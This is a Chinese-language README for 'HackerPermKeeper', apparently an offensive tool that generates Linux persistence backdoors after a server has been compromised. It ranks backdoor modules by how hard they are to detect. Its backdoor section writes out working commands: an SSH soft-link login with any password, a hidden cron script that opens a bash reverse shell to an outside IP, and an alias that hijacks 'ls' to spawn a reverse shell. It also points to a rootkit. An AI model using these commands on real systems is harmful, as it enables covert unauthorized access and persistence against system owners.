# :lock:	HackerPermKeeper  
### 黑客权限保持者
<br/><br/>
  <p align="center">
    <a href="https://www.one-fox.cn/">
      <img alt="GitHub Contributors" src="https://img.shields.io/badge/%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F-One--fox-pink" />
    </a>
    <a href="https://taoyuan.cool/">
      <img alt="GitHub Contributors" src="https://img.shields.io/badge/%E5%8D%9A%E5%AE%A2-taoyuan.cool-blue" />
    </a>
    <a href="[#](https://taoyuan.cool/)">
      <img alt="GitHub Contributors" src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-%E5%BC%B1%E9%B8%A1-red" />
    </a>
    <img src="https://img.shields.io/badge/WeChat-vivo50KFCKFC-black">
    <img src="https://badgen.net/github/stars/ytMuCheng/HackerPermKeeper/?icon=github&color=black">
    <img src="https://img.shields.io/badge/python%E7%89%88%E6%9C%AC-3_and_2-green">
</p>




通过渗透拿到权限之后，为了不让权限丢失，都会进行权限维持，而在进行权限维持的时候，红队需要花费大量的时候，来验证是否合适，因此在这款工具就诞生 HackerPermKeeper[黑客权限保持者] 
<br/>
查看下面的表格可以知道生成的权限维持文件可以运行的python版本，但是这个项目本身是python3运行的

| :lock:权限维持模块                 | centos | Ubuntu | 推荐指数 | 备注                                                         | py2 | py3 |
| :--------------------------- | ------ | ------ | -------- | ------------------------------------------------------------ | ---------------------------- | ---------------------------- |
| OpenSSH后门万能密码&记录密码 |   :x:      |:heavy_check_mark:	    |:star:	        | 此后门需要很老的内核版本，而且需要很多依赖环境               | :x: | :heavy_check_mark: |
| PAM后门                      | :x:     | :x:     | :star:	        | 此后门需要很老的内核版本，而且需要很多依赖环境               | :x: | :x: |
| SSH软链接                    | :heavy_check_mark:	    | :heavy_check_mark:	   | :star:	:star:	       | 容易被发现                                                   | :heavy_check_mark: | :heavy_check_mark: |
| ssh公私密钥                  | :heavy_check_mark:	    | :heavy_check_mark:	    | :star:	:star:	:star:	:star:	:star:	    | 发现程度很难，参考了挖矿病毒                                 | :heavy_check_mark: | :heavy_check_mark: |
| 后门帐号                     | :heavy_check_mark:	    | :heavy_check_mark:	    | :star:	:star:	:star:	      | 用命令添加账户，不会创建用户home目录[有一个是直接指向root目录] | :heavy_check_mark: | :heavy_check_mark: |
| crontab计划任务              | :heavy_check_mark:	   | :heavy_check_mark:	   | :star:	:star:	:star:	:star:	     | 难以发现，通过执行计划任务                                   | :heavy_check_mark: | :heavy_check_mark: |
| Strace后门                   |:heavy_check_mark:	    | :heavy_check_mark:	    | :star:	:star:	       | 键盘记录的后门                                               | :heavy_check_mark: | :heavy_check_mark: |
| Alias后门                    | :heavy_check_mark:	    | :heavy_check_mark:	   | :star:	:star:	:star:	:star:	     | 别名后门，难以发现，但是需要用户去执行命令                   | :heavy_check_mark: | :heavy_check_mark: |
| Rootkit后门                  | :x:     | :x:    | :star:	:star:	:star:	      | 难以发现，但是安装复杂，而且指定内核版本                     | :x: | :x: |


## :rocket:快速使用
![image](https://github.com/ytMuCheng/HackerPermKeeper/assets/79234113/6b71f9b8-cbb4-42e3-8d1d-3a30e37163b8)

```
python3运行安全此项目，但是运行权限维持模块脚本请看上面的表格
安装依赖
pip install -r requirements.txt
```
![image](https://github.com/ytMuCheng/HackerPermKeeper/assets/79234113/1d4af51c-dfbe-484e-b70f-009214a4635c)

```
快速判断目标机器适合的权限维持模块，运行 /check/ 目录下的check.py文件[这个不需要任何依赖环境，python3和python2都支持]
python check.py
```
![image](https://github.com/ytMuCheng/HackerPermKeeper/assets/79234113/db6bb1ad-4b7d-44d8-b0bd-bd1cca3e56a7)

```
查看权限维持模块信息
python main.py -c 1
```
![image](https://github.com/ytMuCheng/HackerPermKeeper/assets/79234113/6eb5f2c6-9870-4988-a2a8-67a8df71c0e2)
```
查看权限维持模详细块信息
python main.py -c 2
```
![image](https://github.com/ytMuCheng/HackerPermKeeper/assets/79234113/5937624c-b75b-4b51-a197-118b5a14f393)

```
使用此项目生成模块[在这之前，请先运行check.py脚本判断出目标机器适合什么类型权限维持的脚本]
```









## :triangular_flag_on_post:	常见后门介绍
```
OpenSSH后门万能密码&记录密码（这个需要依赖环境），就是把对方的门换个锁，但是原来的钥匙也可以使用
发现程度：||

PAM后门，PAM是一个Linux登录验证的认证服务，修改其中关于ssh登录的验证，添加一个万能密码，已经记录的账号密码位置（类似把对方房间内有内鬼）
发现程度：||


SSH软链接
cat /etc/ssh/sshd_config|grep UsePAM
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888
ssh root@xx.xx.xx.xx -p 8888 任意密码登录即可
发现程度：||||||


公私钥
使用密钥进行登录
发现程度：||||||


后门帐号
使用命令添加账号
发现程度：||||||


crontab后计划任务
1、编辑后门反弹
vim /etc/.111.sh

#!/bin/bash
sh -i >& /dev/tcp/192.168.86.137/3434 0>&1

chmod +x /etc/.111.sh

2、添加定时任务
vim /etc/crontab
*/1 * * * * root /etc/.1111.sh
发现程度：||||||


Strace后门
strace是一个动态跟踪工具，它可以跟踪系统调用的执行。
我们可以把他当成一个键盘记录的后门，来扩大我们的信息收集范围
可以记录ssh明文和密钥（登录的）和Rootkit配合一起
发现程度：||||

命令自定义-Alias后门
alias命令的功能：为命令设置别名
alias ls='alerts(){ ls $* --color=auto;bash -i >& /dev/tcp/192.168.86.137/3333 0>&1; };alerts'
执行ls就会反弹shell
持久化+隐藏：重启依旧生效
发现程度：||||

Rootkit后门
https://github.com/f0rb1dd3n/Reptile/releases/
Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。
发现程度：||
但是使用工具进行检测出来情况很大，建议看代码，手动编写此工具（难度很大）


|||||  越多，越容易发发现
||        越少，越难发现，但是部署起来，需要的依赖很多

```





## :star2:Stargazers over time [![Stargazers over time](https://starchart.cc/ytMuCheng/HackerPermKeeper.svg)](https://starchart.cc/ytMuCheng/HackerPermKeeper) 




<a href="https://github.com/ytMuCheng">
  <img height=150 align="center" src="https://github-readme-stats.vercel.app/api?username=ytMuCheng"/>
</a>
<a href="https://github.com/ytMuCheng/HackerPermKeeper/">
  <img height=150 align="center" src="https://github-readme-stats.vercel.app/api/top-langs?username=ytMuCheng&layout=compact&langs_count=8&card_width=320" />
</a>
